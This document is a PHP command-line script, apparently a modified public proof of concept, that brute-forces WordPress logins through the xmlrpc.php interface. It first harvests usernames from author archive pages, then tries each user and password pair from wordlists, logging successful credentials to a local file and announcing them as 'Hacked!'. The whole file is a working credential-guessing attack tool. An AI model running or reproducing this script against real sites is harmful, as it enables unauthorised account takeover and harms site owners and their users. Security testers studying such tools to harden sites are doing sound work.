#!/usr/bin/php
<?php
/*****

autor: El3ct71k
source: https://github.com/El3ct71k/WordPress-XMLRPC-BruteForce-PoC
modification: _bop
why modification?: I add the function "wp_getUsers" to better bruteforce users. And fixxed little bugs.
            Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
            WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.
date of modification: 03.03.2015

changes: (11.03.2015): bugfix EOL in the user and pass var

***/
error_reporting(E_ALL);
require("class-IXR.php");
require("grab-page.php");

class XMLRPC_WP {
	function __construct($site, $users_file, $passwords_file) {
		## Set initial variables.. 
		$this->site = rtrim( $site, "/" );
		$this->users_file = null;
		$this->passwords_file = null;
		## Read a username and password files
		$this->create_lists($users_file, $passwords_file);
	}
	function create_lists($users_file, $passwords_file) {
	  echo "[~] Start wpbf on ".$this->site.PHP_EOL;
		if(!file_exists($users_file)) {
			echo("[-] User list doesn't exists!".PHP_EOL);
			exit(0);	
		} else if(!file_exists($passwords_file)) {
			echo("[-] Password list doesn't exists!".PHP_EOL);
			exit(0);
		} else {
		  ## get user/pass names by author exploit
		  foreach( $this->wp_getUsers() as $user ) {
		      $user = trim($user);
		      $user = trim($user, PHP_EOL);
		      $this->users_file[] = $user;
		      $this->passwords_file[] = $user;
		  }
		  ## load user list by file
		  foreach( file( $users_file, FILE_IGNORE_NEW_LINES ) as $user ) {
		      $user = trim($user);
		      $user = trim($user, PHP_EOL);
		      $this->users_file[] = $user;
		  }
		  ## load pass list by file
		  foreach( file( $passwords_file, FILE_IGNORE_NEW_LINES ) as $pass ) {
		      $pass = trim($pass);
		      $pass = trim($pass, PHP_EOL);
		      $this->passwords_file[] = $pass;
		  }
			## duplikat killer
      $this->users_file = array_values(array_unique($this->users_file));
      $this->passwords_file = array_values(array_unique($this->passwords_file));
      ## display infos
      echo "[~] Loaded ".count($this->users_file)." users".PHP_EOL;
      echo "[~] Loaded ".count($this->passwords_file)." passwords".PHP_EOL;
		}
	}
	function wp_getUsers() {
	  $users = array();
	  for( $i=0; $i<=5; $i++ ) {
      $html = grab_page( $this->site . '/?author=' . $i, $this->site );
      if( $html[1]["http_code"] >= 200 && $html[1]["http_code"] < 400 ) {
        if( preg_match( "#<title>.*</title>#iU", $html[0], $match ) ) {
          $ue = $match[0];
          $ue = strip_tags( $ue );
          $ue = preg_split( "#&[^\s]*;|-|\|,|›|\||»|,#", $ue );
          $ue = array_map( "trim", $ue );
          foreach( $ue as $k=>$v ) {
              if( $v == "" or $v == " " ) continue;
              if( strlen( $v ) <= 3 ) continue;
              $users[] = $v;
          }
        }
      }
    }
    $users = array_values(array_unique($users));
    //print_r( $users );
    echo "[+] Found " . count($users) . " usernames: " . implode (", ", $users) . PHP_EOL;
    return $users;
	}

  function dev_log($str) {
    $handler = fopen( "./dev.html", "w+" );
    fwrite( $handler, $str );
    fclose( $handler );
  }

	function login($username, $password) {
		$client = new IXR_Client($this->site . '/xmlrpc.php');
		if (!$client->query('wp.getCategories','', $username,$password)) {  
			return False;
		}
		return True;
	}

	function bruteforce() {
		echo("[~] Running..".PHP_EOL);
		$flag = False;
		foreach($this->users_file as $user) {
			foreach($this->passwords_file as $password) {
				if($this->login($user, $password) == True) {
					$flag = True;
					$this->save( $user, $password );
					echo("[+] Hacked!".PHP_EOL."Username: " . $user . PHP_EOL."Password: " . $password . PHP_EOL);
					echo("[~] Done!".PHP_EOL);
				}
			}
		}
		if(!$flag) {
			echo("[-] Login credentials not found.".PHP_EOL);
		}
	}
	function save($user,$pass) {
	  $str = "{$this->site}  [{$user}:{$pass}]".PHP_EOL;
	  $handler = fopen( "./wpbf.log", "a" );
	  fwrite( $handler, $str );
	  fclose( $handler );
	}
}

if(isset($argv[1]) && isset($argv[2]) && isset($argv[3])) {
	if( !parse_url($argv[1], PHP_URL_SCHEME) ) {
		echo("[-] URL Invalid!".PHP_EOL."Example URL: http(s)://example.com".PHP_EOL);
		exit(0);		
	}
	$rpcbruteforce = new XMLRPC_WP($argv[1], $argv[2], $argv[3]);
	$rpcbruteforce->bruteforce();
} else {
	echo("[~] USAGE: ". $argv[0]. " http://www.example.com/wp/ usernames.txt passwords.txt".PHP_EOL);
}

?>
